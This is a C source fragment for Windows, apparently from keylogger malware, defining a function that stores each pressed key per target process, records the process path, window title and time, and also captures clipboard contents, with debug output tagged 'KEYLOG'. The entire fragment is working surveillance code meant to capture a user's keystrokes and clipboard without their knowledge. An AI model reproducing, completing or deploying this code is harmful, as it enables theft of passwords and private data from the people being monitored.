//
//	Adds a new pressed key information into the key store.
//
WINERROR KeyStoreAdd(
	PKEY_INFO	pKeyInfo
	)
{
	WINERROR		Status = ERROR_NOT_ENOUGH_MEMORY;
	ULONG			KeyHandle;
	PKEY_CONTEXT	Ctx;
	BOOL            bDeref = FALSE;

	KeyHandle = Crc32((PCHAR)&pKeyInfo->Client, sizeof(CLIENT_INFO));
	
	if (Ctx = GetContext(KeyHandle))
	{
		bDeref = Ctx->bDirty;		
		if (Ctx->bDirty == FALSE) // just created
		{
			// Context has just been created, initializing
			HANDLE	hProcess;

			// Resolving process path
			if (hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pKeyInfo->Client.ProcessId))
			{
				GetModuleFileNameExW(hProcess, NULL, (LPWSTR)&Ctx->ProcessPath, MAX_PATH);
				CloseHandle(hProcess);
			}

			Ctx->bActive = TRUE;

			// Saving current date and time
			GetSystemTimeAsFileTime(&Ctx->Time);
			
			// Resolving parent window text
			GetWindowTextW(pKeyInfo->Client.ParentWindow, (LPWSTR)&Ctx->WindowText, MAX_WINDOW_TEXT);
		}	// if (Ctx->bDirty == FALSE) // just created

		Ctx->bDirty = TRUE;

		if (Ctx->bActive)
		{
			if (pKeyInfo->wChar && Ctx->Count < MAX_KEY_BUFFER_SIZE)
			{
				if (pKeyInfo->wChar == VK_BACK)
				{
					if (Ctx->Count)
						Ctx->Count -= 1;
				}
				else
				{
					Ctx->KeyBuffer[Ctx->Count] = pKeyInfo->wChar;
					Ctx->Count += 1;
					DbgPrint("KEYLOG: Adding key to a buffer: 0x%x, %C\n", pKeyInfo->wChar, pKeyInfo->wChar);
				}
				Status = NO_ERROR;
			}	// if (Ctx->Count < MAX_KEY_BUFFER_SIZE)
			else
				Status = ERROR_BUFFER_OVERFLOW;

			if ( pKeyInfo->clipboard )
			{
				PCLIPBOARD_ENTRY Entry = (PCLIPBOARD_ENTRY)AppAlloc( sizeof(CLIPBOARD_ENTRY) );
				if ( Entry )
				{
					// Saving current date and time
					GetSystemTimeAsFileTime(&Entry->Time);
					Entry->Buffer = pKeyInfo->clipboard;
					pKeyInfo->clipboard = NULL; // we'll free it later
					InsertTailList(&Ctx->ClipboardChain,&Entry->qLink);
				}
			}	// if ( pKeyInfo->clipboard )
		}	// if (Ctx->bActive)

		if ( bDeref )
			// Context has been reused, dereferencing it
			ReleaseContext(Ctx);
	}	// if (Ctx = GetContext(KeyHandle))

	return(Status);
}